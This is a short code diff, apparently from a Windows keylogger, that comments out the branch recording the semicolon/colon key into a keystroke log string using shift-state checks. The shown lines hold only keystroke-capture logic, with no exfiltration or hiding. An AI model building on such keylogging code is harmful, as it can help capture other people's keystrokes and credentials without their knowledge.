@@ -732,18 +732,18 @@ int save(const int key)
 			}
 		}
 	//
-	case 186:
-		::backspace = 0;
-		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
-		{
-			sLogs += ":";
-			break;
-		}
-		else
-		{
-			sLogs += ";";
-		}
-		break;
+	//case 186:
+	//	::backspace = 0;
+	//	if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+	//	{
+	//		sLogs += ":";
+	//		break;
+	//	}
+	//	else
+	//	{
+	//		sLogs += ";";
+	//	}
+	//	break;
 	//
 	//Decimal key codes
 	case 13:
